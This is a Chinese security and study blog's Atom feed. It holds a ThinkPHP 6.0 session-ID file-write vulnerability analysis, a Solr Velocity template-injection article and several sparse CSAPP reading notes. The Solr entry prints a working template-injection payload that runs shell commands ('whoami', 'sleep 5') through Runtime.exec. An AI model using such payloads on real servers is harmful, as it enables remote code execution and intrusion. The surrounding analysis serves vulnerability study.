<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wywwzjj&#39;s Blog</title>
  
  <subtitle>爱学习，爱分享，爱生活</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://wywwzjj.top/"/>
  <updated>2020-01-21T09:33:23.900Z</updated>
  <id>https://wywwzjj.top/</id>
  
  <author>
    <name>wywwzjj</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ThinkPHP 6.0 任意文件写入</title>
    <link href="https://wywwzjj.top/2020/01/17/thinkphp-6.0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/"/>
    <id>https://wywwzjj.top/2020/01/17/thinkphp-6.0-任意文件写入/</id>
    <published>2020-01-17T05:23:27.000Z</published>
    <updated>2020-01-21T09:33:23.900Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>2020 年 1 月 10 日，ThinkPHP 团队发布一个补丁更新，修复了一处由不安全的 SessionId 导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell。</p><p>具体受影响版本为 ThinkPHP 6.0.0 - 6.0.1。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>composer 创建项目。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think thinkphp6.0.0</span><br></pre></td></tr></table></figure><p>再将到 composer.json 改下版本：<strong>“topthink/framework”: “6.0.0”</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><p>在 app/controller/Index.php 中加一行代码，使 session 内容可控，方便漏洞复现。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        session(<span class="string">'test'</span>, input(<span class="string">'j'</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>PS：TP 6 默认没开启 session，手动开下，在 app/middleware.php 取消注释即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">    <span class="comment">// \think\middleware\LoadLangPack::class,</span></span><br><span class="line">    <span class="comment">// Session初始化</span></span><br><span class="line">     \think\middleware\SessionInit::class</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb4a0ti4lcj213e0720tb.jpg" alt="image.png"></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb49ddcctkj20jr07lgt2.jpg" alt="image.png"></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb49jb7nx7j213g09lt9q.jpg" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a></p><p>如果传入的 id 长度为 32 即可控。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># src/think/session/Store.php</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = is_string($id) &amp;&amp; strlen($id) === <span class="number">32</span> ? $id : md5(microtime(<span class="keyword">true</span>) . session_create_id());</span><br></pre></td></tr></table></figure><p><code>handle</code> 函数将 cookie 中的 <code>PHPSESSID</code> 对应的值设为 sessionId。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// middleware/SessionInit.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">($request, Closure $next)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Session初始化</span></span><br><span class="line">    $varSessionId = <span class="keyword">$this</span>-&gt;app-&gt;config-&gt;get(<span class="string">'session.var_session_id'</span>);</span><br><span class="line">    $cookieName   = <span class="keyword">$this</span>-&gt;session-&gt;getName();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) &#123;</span><br><span class="line">        $sessionId = $request-&gt;request($varSessionId);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $sessionId = $request-&gt;cookie($cookieName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($sessionId) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;session-&gt;setId($sessionId);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb48yn48kvj20ph0263yf.jpg" alt="image.png"></p><p>剩下的文件处理其实就是 session 本身的处理了，比如 $_SESSION 数组被序列化后写入文件保存以及清除。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/think/session/Store.php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 保存session数据</span></span><br><span class="line"><span class="comment">* <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span>: <span class="title">void</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;clearFlashData();</span><br><span class="line">    $sessionId = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler-&gt;write($sessionId, $data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// data 为空就进行删除</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler-&gt;delete($sessionId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;init = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 <code>$this-&gt;handler-&gt;write($sessionId, $data);</code> 的具体实现。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// session/driver/File.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(string $sessID, string $sessData)</span>: <span class="title">bool</span> </span>&#123;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;getFileName($sessID, <span class="keyword">true</span>);</span><br><span class="line">    $data     = $sessData;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">        <span class="comment">//数据压缩</span></span><br><span class="line">        $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;writeFile($filename, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里就落实到 file_put_contents() 了</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span><span class="params">($path, $content)</span>: <span class="title">bool</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (bool) file_put_contents($path, $content, LOCK_EX);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>总的来说还是比较鸡肋，需要能控制 session，直接打不了。</p><p>所以要与具体的业务结合，寻找 session 的输入点，比如某些系统将用户名直接存入 session 中。</p><p>另外，那个删除点就更难控制了，那也是 TP 清除 session 的正常功能，所以能删的文件必须以 <code>sess_</code> 开头。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw</a></p><p><a href="https://mochazz.github.io/2020/01/14/ThinkPHP6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99" target="_blank" rel="noopener">https://mochazz.github.io/2020/01/14/ThinkPHP6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;2020 年 1 月 10 日，ThinkPHP 团队发布一个补丁更新，修复了一处由不安全的 SessionId 导致的任意文件操作漏洞。该
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://wywwzjj.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 并发编程 笔记</title>
    <link href="https://wywwzjj.top/2019/12/16/CSAPP-Chapter-12-Notes/"/>
    <id>https://wywwzjj.top/2019/12/16/CSAPP-Chapter-12-Notes/</id>
    <published>2019-12-16T12:47:57.000Z</published>
    <updated>2019-12-22T15:58:28.931Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基于进程的并发"><a href="#基于进程的并发" class="headerlink" title="基于进程的并发"></a>基于进程的并发</h2><p>基于进程的并发服务器</p><p>进程的优劣</p><h2 id="基于-I-O-多路复用的并发"><a href="#基于-I-O-多路复用的并发" class="headerlink" title="基于 I/O 多路复用的并发"></a>基于 I/O 多路复用的并发</h2><p>基于 I/O 多路复用的并发事件驱动服务器</p><p>I/O 多路复用技术的优劣</p><h2 id="基于线程的并发"><a href="#基于线程的并发" class="headerlink" title="基于线程的并发"></a>基于线程的并发</h2><p>线程执行模型</p><p>POSIX 线程</p><p>创建线程</p><p>终止线程</p><p>回收已终止线程的资源</p><p>分离线程</p><p>初始化线程</p><p>基于线程的并发服务器</p><h2 id="多线程程序中的共享变量"><a href="#多线程程序中的共享变量" class="headerlink" title="多线程程序中的共享变量"></a>多线程程序中的共享变量</h2><p>线程内存模型</p><p>将变量映射到内存</p><p>共享变量</p><h2 id="用信号量同步线程"><a href="#用信号量同步线程" class="headerlink" title="用信号量同步线程"></a>用信号量同步线程</h2><h3 id="进度图"><a href="#进度图" class="headerlink" title="进度图"></a>进度图</h3><p>信号量</p><p>使用信号量实现互斥</p><p>利用信号量来调度共享资源</p><p>综合：基于预线程化的并发服务器</p><h2 id="使用线程提供并行性"><a href="#使用线程提供并行性" class="headerlink" title="使用线程提供并行性"></a>使用线程提供并行性</h2><h2 id="其他线程并发问题"><a href="#其他线程并发问题" class="headerlink" title="其他线程并发问题"></a>其他线程并发问题</h2><p>线程安全</p><p>可重入性</p><p>在线程化的程序中使用已存在的库函数</p><p>竞争</p><p>死锁</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基于进程的并发&quot;&gt;&lt;a href=&quot;#基于进程的并发&quot; class=&quot;headerlink&quot; title=&quot;基于进程的并发&quot;&gt;&lt;/a&gt;基于进程的并发&lt;/h2&gt;&lt;p&gt;基于进程的并发服务器&lt;/p&gt;
&lt;p&gt;进程的优劣&lt;/p&gt;
&lt;h2 id=&quot;基于-I-O-多路复用的并发
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>java-security-calendar-2019</title>
    <link href="https://wywwzjj.top/2019/12/07/java-security-calendar-2019/"/>
    <id>https://wywwzjj.top/2019/12/07/java-security-calendar-2019/</id>
    <published>2019-12-07T11:38:18.000Z</published>
    <updated>2019-12-10T06:58:31.153Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Candy-Cane"><a href="#Candy-Cane" class="headerlink" title="Candy Cane"></a>Candy Cane</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.jdom2.Content;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.Document;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.JDOMException;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.input.SAXBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ImportDocument</span> </span>&#123;</span><br><span class="line">    <span class="comment">// This function extracts the text of an OpenOffice document</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">extractString</span><span class="params">()</span> <span class="keyword">throws</span> IOException, JDOMException </span>&#123;</span><br><span class="line">        File initialFile = <span class="keyword">new</span> File(<span class="string">"uploaded_office_doc.odt"</span>);</span><br><span class="line">        InputStream in = <span class="keyword">new</span> FileInputStream(initialFile);</span><br><span class="line">        <span class="keyword">final</span> ZipInputStream zis = <span class="keyword">new</span> ZipInputStream(in);</span><br><span class="line">        ZipEntry entry;</span><br><span class="line">        List&lt;Content&gt; content = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((entry = zis.getNextEntry()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (entry.getName().equals(<span class="string">"content.xml"</span>)) &#123;</span><br><span class="line">                <span class="keyword">final</span> SAXBuilder sax = <span class="keyword">new</span> org.jdom2.input.SAXBuilder();</span><br><span class="line">                sax.setFeature(<span class="string">"http://javax.xml.XMLConstants/feature/secure-processing"</span>, <span class="keyword">true</span>);</span><br><span class="line">                Document doc = sax.build(zis);</span><br><span class="line">                content = doc.getContent();</span><br><span class="line">                zis.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">if</span> (content != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Content item : content) &#123;</span><br><span class="line">                sb.append(item.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Eggnog-Madness"><a href="#Eggnog-Madness" class="headerlink" title="Eggnog Madness"></a>Eggnog Madness</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Candy-Cane&quot;&gt;&lt;a href=&quot;#Candy-Cane&quot; class=&quot;headerlink&quot; title=&quot;Candy Cane&quot;&gt;&lt;/a&gt;Candy Cane&lt;/h2&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 网络编程 笔记</title>
    <link href="https://wywwzjj.top/2019/12/02/CSAPP-Chapter-11-Notes/"/>
    <id>https://wywwzjj.top/2019/12/02/CSAPP-Chapter-11-Notes/</id>
    <published>2019-12-02T13:27:57.000Z</published>
    <updated>2019-12-16T13:46:32.310Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 系统级IO 笔记</title>
    <link href="https://wywwzjj.top/2019/11/25/CSAPP-Chapter-10-Notes/"/>
    <id>https://wywwzjj.top/2019/11/25/CSAPP-Chapter-10-Notes/</id>
    <published>2019-11-25T13:45:57.000Z</published>
    <updated>2019-12-16T13:45:34.728Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Solr-RCE-via-Velocity-Template</title>
    <link href="https://wywwzjj.top/2019/11/20/Solr-RCE-via-Velocity-Template/"/>
    <id>https://wywwzjj.top/2019/11/20/Solr-RCE-via-Velocity-Template/</id>
    <published>2019-11-20T08:54:09.000Z</published>
    <updated>2019-11-20T11:15:33.514Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是-Solr？"><a href="#什么是-Solr？" class="headerlink" title="什么是 Solr？"></a>什么是 Solr？</h2><p>Solr 采用 Java 开发，是建立在 Apache Lucene 上的流行的、快速的开源企业搜索平台。 它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。 +</p><p>Solr 具有高度可靠、可伸缩和容错能力，提供分布式索引、复制和负载平衡查询、自动故障转移和恢复、集中配置等功能。Solr 为世界上许多最大的互联网站点的搜索和导航功能提供了动力。</p><p><strong>Solr 版本发展</strong></p><p>版本    发布时间    说明<br>1.1    2007-01-18    -<br>1.3.0    2008-09-15    lucene2.3；引入拼写检查、数据导入、排序、分布式搜索<br>1.4.0    2009-11-09    lucene2.9.3<br>1.4.1    2010-06-24    -<br>3.1.0    2011-03-30    Lucene 3.1.0<br>4.0.0    2013-01-16    Java 1.6 以上，ZooKeeper 3.3.6；引入solrcloud<br>4.1.0    2013-01-21    Java 1.6 以上，lucene4.1<br>4.5.0    2013-10-04    Java 1.6 以上，ZooKeeper 3.4.5<br>4.7.1    2014-04-01    Java 1.6 以上，最后一个采用旧版配置方法版本<br>4.8.0    2014-04-27    Java 1.7 以上，ZooKeeper 3.4.6<br>5.0.0    2015-02-19    Java 1.7 以上，Jetty 8.1.10<br>5.5.0    2016-02-20    Java 1.7 以上，Solr schema version支持1.6<br>6.0.0    2016-04-07    Java 1.8 以上，Jetty 9.3.8<br>6.1.0    2016-08-24    Java 1.8 以上 </p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h2 id="Velocity-SSTI"><a href="#Velocity-SSTI" class="headerlink" title="Velocity SSTI"></a>Velocity SSTI</h2><blockquote><p>Velocity is a Java-based template engine. It permits anyone to use a simple yet powerful template language to reference objects defined in Java code. </p></blockquote><p><a href="https://portswigger.net/research/server-side-template-injection" target="_blank" rel="noopener">https://portswigger.net/research/server-side-template-injection</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$<span class="class"><span class="keyword">class</span>.<span class="title">inspect</span>(<span class="title">class</span>/<span class="title">object</span>/<span class="title">string</span>)<span class="title">returns</span> <span class="title">a</span> <span class="title">new</span> <span class="title">ClassTool</span> <span class="title">instance</span> <span class="title">that</span> <span class="title">inspects</span> <span class="title">the</span> <span class="title">specified</span> <span class="title">class</span> <span class="title">or</span> <span class="title">object</span></span></span><br><span class="line"><span class="class">$<span class="title">class</span>.<span class="title">type</span><span class="title">returns</span> <span class="title">the</span> <span class="title">actual</span> <span class="title">Class</span> <span class="title">being</span> <span class="title">inspected</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()</span><br><span class="line">    </span><br><span class="line">#set($str=$class.inspect("java.lang.String").type)</span><br><span class="line">#set($chr=$class.inspect("java.lang.Character").type)</span><br><span class="line">#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是-Solr？&quot;&gt;&lt;a href=&quot;#什么是-Solr？&quot; class=&quot;headerlink&quot; title=&quot;什么是 Solr？&quot;&gt;&lt;/a&gt;什么是 Solr？&lt;/h2&gt;&lt;p&gt;Solr 采用 Java 开发，是建立在 Apache Lucene 上的流行的、快
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 虚拟存储器 笔记</title>
    <link href="https://wywwzjj.top/2019/11/11/CSAPP-Chapter-9-Notes/"/>
    <id>https://wywwzjj.top/2019/11/11/CSAPP-Chapter-9-Notes/</id>
    <published>2019-11-11T14:57:57.000Z</published>
    <updated>2019-12-24T01:40:40.868Z</updated>
    
    <content type="html"><![CDATA[<p>一个系统中的进程是与其他进程共享 CPU 和主存资源的。然而，共享主存会形成一些特殊的挑战。</p><p>虚拟内存提供了三个重要的能力：</p><ul><li>它将主存看成是一个存储在磁盘上的地址空间的高速缓存，在主存中只保存活动区域，并根据需要在主存之间来回传送数据，通过这种方式，它高效地使用了主存。</li><li>它为每个进程提供了一致的地址空间，从而简化了内存管理。</li><li>它保护了每个进程的地址空间不被其他进程破坏。</li></ul><p><img src="CSAPP-Chapter-9-Notes.assets/de75fd55gy1ga7ke1rrzxj20hu0g7gn7.jpg" alt="image.png"></p><h2 id="物理和虚拟寻址"><a href="#物理和虚拟寻址" class="headerlink" title="物理和虚拟寻址"></a>物理和虚拟寻址</h2><p>计算机系统的主存被组织成一个由 M 个连续的字节大小的单元组成的数组。每个字节都有一个唯一的物理地址。</p><p>在物理地址与虚拟地址间加个地址翻译就构成了虚拟寻址。</p><h2 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h2><p>地址空间是一个非负整数地址的有序集合。</p><p>地址空间的概念是很重要的，因为它清楚地区分了数据对象（字节）和他们的属性（地址）。</p><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>内存成了对硬盘的缓存，虚拟页面可划分为未分配的、未缓存的和已缓存的。</p><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><ul><li>简化链接</li><li>简化加载</li><li>简化共享</li><li>简化内存分配</li></ul><h2 id="内存保护"><a href="#内存保护" class="headerlink" title="内存保护"></a>内存保护</h2><ul><li><h2 id="地址翻译"><a href="#地址翻译" class="headerlink" title="地址翻译"></a>地址翻译</h2></li></ul><p>逻辑地址到物理地址</p><h2 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h2><p>回到本章前言，“虚拟内存是强大的”。</p><ul><li>你知道可以通过读写内存位置读或者修改一个磁盘文件的内容吗？</li><li>可以加载一个文件的内容到内存中，而不需要进行任何显示地复制吗？</li></ul><p>将一个文件或其他对象映射到进程的地址空间，实现文件磁盘地址和进程地址空间中一段虚拟地址的一一对应。</p><p>实现了这样的映射关系后，进程就可以采用指针的方式读写操作这一段内存，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用 read、write 等系统调用函数。</p><p>相反，内核空间对这段区域的修改也直接反应用户空间，从而可以实现不同进程的文件共享。</p><p>简单总结，有如下特点：</p><ul><li>提高数据的读、写和传输的时间性能<ul><li>减少了数据拷贝次数</li><li>用户空间和内核空间的高效交互（通过映射区域直接交互）</li><li>用内存读写代替 I/O 读写</li></ul></li><li>提高内存利用率：通过虚拟内存、共享对象</li></ul><h2 id="动态内存分配"><a href="#动态内存分配" class="headerlink" title="动态内存分配"></a>动态内存分配</h2><h2 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一个系统中的进程是与其他进程共享 CPU 和主存资源的。然而，共享主存会形成一些特殊的挑战。&lt;/p&gt;
&lt;p&gt;虚拟内存提供了三个重要的能力：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;它将主存看成是一个存储在磁盘上的地址空间的高速缓存，在主存中只保存活动区域，并根据需要在主存之间来回传送数据
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 异常控制流 笔记</title>
    <link href="https://wywwzjj.top/2019/10/28/CSAPP-Chapter-8-Notes/"/>
    <id>https://wywwzjj.top/2019/10/28/CSAPP-Chapter-8-Notes/</id>
    <published>2019-10-28T13:13:22.000Z</published>
    <updated>2019-11-17T14:58:31.871Z</updated>
    
    <content type="html"><![CDATA[<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>异常是异常控制流的一种形式，它一部分由硬件实现，一部分由操作系统实现。</p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p><strong>关键抽象：</strong></p><ul><li>一个独立的逻辑控制流，它提供一个假象，好像程序独占了处理器。</li><li>一个私有的地址空间，它提供了一个假象，好像程序独占了内存系统。</li></ul><h3 id="逻辑控制流"><a href="#逻辑控制流" class="headerlink" title="逻辑控制流"></a>逻辑控制流</h3><h3 id="并发流"><a href="#并发流" class="headerlink" title="并发流"></a>并发流</h3><h3 id="私有地址空间"><a href="#私有地址空间" class="headerlink" title="私有地址空间"></a>私有地址空间</h3><h3 id="用户模式和内核模式"><a href="#用户模式和内核模式" class="headerlink" title="用户模式和内核模式"></a>用户模式和内核模式</h3><h3 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h3><h2 id="系统调用错误处理"><a href="#系统调用错误处理" class="headerlink" title="系统调用错误处理"></a>系统调用错误处理</h2><p>参见 <code>error.h</code>，这里想说的还是对错误返回处理的封装。</p><h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><p>程序员角度，可认为进程总是处于三种状态之一：</p><ul><li><p>运行：进程要么在 CPU 上执行，要么在等待被执行且最终会被内核调度。</p></li><li><p>停止：进程的执行被挂起（suspended），且不会被调度，直到收到 SIGCONT 